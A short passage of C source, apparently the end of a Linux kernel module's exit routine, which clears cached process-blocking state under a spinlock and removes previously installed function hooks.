    spin_lock_irqsave(&cache_lock, flags);
    last_blocked_pid = 0;
    last_check_jiffies = 0;
    spin_unlock_irqrestore(&cache_lock, flags);
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
